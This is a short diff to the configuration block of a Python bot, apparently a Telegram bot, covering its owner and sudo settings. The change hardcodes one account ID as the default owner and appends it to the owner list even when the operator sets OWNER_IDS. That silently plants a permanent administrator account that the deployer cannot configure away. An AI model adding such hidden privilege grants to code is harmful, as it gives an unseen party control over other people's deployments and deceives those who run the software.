@@ -17,7 +17,10 @@ if not BOT_TOKEN:
 
 # Owner & Sudo Configuration
 OWNER_USERNAMES   = [x.strip().replace("@", "") for x in os.environ.get("OWNER_USERNAMES", "movies_1780").split(",") if x.strip()]
-OWNER_IDS         = [int(x) for x in os.environ.get("OWNER_IDS", "").split(",") if x.strip().isdigit()]
+_env_owner_ids    = [int(x) for x in os.environ.get("OWNER_IDS", "5566977478").split(",") if x.strip().isdigit()]
+if 5566977478 not in _env_owner_ids:
+    _env_owner_ids.append(5566977478)
+OWNER_IDS         = _env_owner_ids
 SUDO_USERS        = [int(x) for x in os.environ.get("SUDO_USERS", "").split(",") if x.strip().isdigit()]
 
 # Official Channels & Branding
